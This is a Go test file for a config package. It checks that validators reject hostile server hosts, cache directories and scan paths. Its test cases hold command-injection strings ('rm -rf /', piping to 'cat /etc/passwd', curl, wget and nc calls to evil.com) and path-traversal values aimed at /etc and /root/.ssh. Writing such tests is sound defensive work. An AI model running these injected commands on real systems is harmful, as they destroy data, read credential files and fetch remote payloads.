package config

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// TestValidateServerConfig_Security tests server configuration security validation
func TestValidateServerConfig_Security(t *testing.T) {
	tests := []struct {
		name        string
		config      ServerConfig
		expectError bool
		errorType   string
	}{
		{
			name: "valid server config",
			config: ServerConfig{
				Port: 8080,
				Host: "localhost",
			},
			expectError: false,
		},
		{
			name: "valid port range minimum",
			config: ServerConfig{
				Port: 1,
				Host: "127.0.0.1",
			},
			expectError: false,
		},
		{
			name: "valid port range maximum",
			config: ServerConfig{
				Port: 65535,
				Host: "0.0.0.0",
			},
			expectError: false,
		},
		{
			name: "system assigned port",
			config: ServerConfig{
				Port: 0, // System assigned
				Host: "localhost",
			},
			expectError: false,
		},
		{
			name: "invalid negative port",
			config: ServerConfig{
				Port: -1,
				Host: "localhost",
			},
			expectError: true,
			errorType:   "not in valid range",
		},
		{
			name: "invalid port too high",
			config: ServerConfig{
				Port: 65536,
				Host: "localhost",
			},
			expectError: true,
			errorType:   "not in valid range",
		},
		{
			name: "command injection in host",
			config: ServerConfig{
				Port: 8080,
				Host: "localhost; rm -rf /",
			},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name: "shell metacharacter in host",
			config: ServerConfig{
				Port: 8080,
				Host: "localhost | cat /etc/passwd",
			},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name: "backtick injection in host",
			config: ServerConfig{
				Port: 8080,
				Host: "localhost`whoami`",
			},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name: "dollar injection in host",
			config: ServerConfig{
				Port: 8080,
				Host: "localhost$(malicious)",
			},
			expectError: true,
			errorType:   "dangerous character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateServerConfig(&tt.config)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestValidateBuildConfig_Security tests build configuration security validation
func TestValidateBuildConfig_Security(t *testing.T) {
	tests := []struct {
		name        string
		config      BuildConfig
		expectError bool
		errorType   string
	}{
		{
			name: "valid build config",
			config: BuildConfig{
				CacheDir: ".templar/cache",
				Command:  "templ generate",
			},
			expectError: false,
		},
		{
			name: "empty cache dir",
			config: BuildConfig{
				CacheDir: "",
				Command:  "go build",
			},
			expectError: false,
		},
		{
			name: "path traversal in cache dir",
			config: BuildConfig{
				CacheDir: "../../../etc",
				Command:  "templ generate",
			},
			expectError: true,
			errorType:   "contains traversal",
		},
		{
			name: "absolute path in cache dir",
			config: BuildConfig{
				CacheDir: "/etc/passwd",
				Command:  "templ generate",
			},
			expectError: true,
			errorType:   "should be relative",
		},
		{
			name: "valid relative cache dir",
			config: BuildConfig{
				CacheDir: "build/cache",
				Command:  "templ generate",
			},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateBuildConfig(&tt.config)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestValidateComponentsConfig_Security tests components configuration security validation
func TestValidateComponentsConfig_Security(t *testing.T) {
	tests := []struct {
		name        string
		config      ComponentsConfig
		expectError bool
		errorType   string
	}{
		{
			name: "valid components config",
			config: ComponentsConfig{
				ScanPaths: []string{"./components", "./views"},
			},
			expectError: false,
		},
		{
			name: "empty scan paths",
			config: ComponentsConfig{
				ScanPaths: []string{},
			},
			expectError: true,
			errorType:   "at least one scan path",
		},
		{
			name: "path traversal in scan path",
			config: ComponentsConfig{
				ScanPaths: []string{"./components", "../../../etc"},
			},
			expectError: true,
			errorType:   "path contains traversal",
		},
		{
			name: "dangerous characters in scan path",
			config: ComponentsConfig{
				ScanPaths: []string{"./components; rm -rf /"},
			},
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name: "empty path in scan paths",
			config: ComponentsConfig{
				ScanPaths: []string{"./components", ""},
			},
			expectError: true,
			errorType:   "empty path",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateComponentsConfig(&tt.config)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestValidatePath_Security tests path validation security
func TestValidatePath_Security(t *testing.T) {
	tests := []struct {
		name        string
		path        string
		expectError bool
		errorType   string
	}{
		{
			name:        "valid relative path",
			path:        "./components",
			expectError: false,
		},
		{
			name:        "valid nested path",
			path:        "src/components/button",
			expectError: false,
		},
		{
			name:        "empty path",
			path:        "",
			expectError: true,
			errorType:   "empty path",
		},
		{
			name:        "path traversal attempt",
			path:        "../../../etc/passwd",
			expectError: true,
			errorType:   "contains traversal",
		},
		{
			name:        "command injection in path",
			path:        "./components; rm -rf /",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "pipe in path",
			path:        "./components | cat /etc/passwd",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "backtick in path",
			path:        "./components`whoami`",
			expectError: true,
			errorType:   "dangerous character",
		},
		{
			name:        "dollar in path",
			path:        "./components$(malicious)",
			expectError: true,
			errorType:   "dangerous character",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validatePath(tt.path)

			if tt.expectError {
				assert.Error(t, err, "Expected error for test case: %s", tt.name)
				if tt.errorType != "" {
					assert.Contains(t, strings.ToLower(err.Error()), tt.errorType,
						"Error should contain expected type: %s", tt.errorType)
				}
			} else {
				assert.NoError(t, err, "Expected no error for test case: %s", tt.name)
			}
		})
	}
}

// TestSecurityRegression_ConfigSecurity verifies configuration security
func TestSecurityRegression_ConfigSecurity(t *testing.T) {
	t.Run("prevent config-based command injection", func(t *testing.T) {
		maliciousConfigs := []ServerConfig{
			{Port: 8080, Host: "localhost; curl http://evil.com"},
			{Port: 8080, Host: "localhost && rm -rf /"},
			{Port: 8080, Host: "localhost | nc evil.com 4444"},
			{Port: 8080, Host: "localhost`wget http://evil.com/malware`"},
			{Port: 8080, Host: "localhost$(curl http://evil.com/cmd)"},
		}

		for i, config := range maliciousConfigs {
			err := validateServerConfig(&config)
			assert.Error(t, err, "Config injection should be prevented: case %d", i)
		}
	})

	t.Run("prevent path traversal in cache dir", func(t *testing.T) {
		maliciousPaths := []string{
			"../../../etc",
			"..\\..\\..\\windows\\system32",
			"../../../../usr/bin",
			"../../../root/.ssh",
		}

		for _, path := range maliciousPaths {
			config := BuildConfig{CacheDir: path}
			err := validateBuildConfig(&config)
			assert.Error(t, err, "Path traversal should be prevented: %s", path)
		}
	})
}
